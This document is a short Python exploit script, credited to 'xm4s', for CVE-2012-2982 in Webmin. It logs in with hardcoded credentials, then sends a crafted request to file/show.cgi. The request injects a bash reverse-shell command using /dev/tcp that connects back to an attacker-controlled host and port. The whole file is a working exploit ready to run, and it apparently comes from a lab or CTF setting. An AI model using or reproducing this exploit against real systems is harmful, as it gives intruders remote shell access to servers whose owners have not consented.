#
#by xm4s
#
#!/bin/bash/env python
#CVE-2012-2982

import requests
import random
import string
import sys

RHOST = sys.argv[1]
RPORT = "80" #change
LHOST = "10.11.51.186" #change
LPORT = "443" #change

#authentification
data_to_send = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
rhost_url = "http://" + RHOST + "/session_login.cgi"

req = requests.post(rhost_url, data=data_to_send, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if req.status_code == 302 and req.cookies["sid"] != None:
    print("[+] Logged in successful")

    c_sid = req.cookies["sid"]
    s = req.headers["Set-Cookie"].replace("\n", "").split("=")[1].split(";")[0].strip()
    si = req.headers["Set-Cookie"].split("=")[1].split(";")[0].strip()
    sid = c_sid.strip("/=; ")

#exploit
    payload = f"bash -c 'exec bash -i &>/dev/tcp/{LHOST}/{LPORT}<&1'"

    alpha_num = string.ascii_letters + string.digits
    rand_str = "".join(random.choice(alpha_num) for i in range(5))

    exploit = f"http://{RHOST}/file/show.cgi/bin/{rand_str}|{payload}|"
    exploit_req = requests.post(exploit, cookies={"sid":sid}, verify=False, allow_redirects=False)

else:
    print("[-] Log in failed")
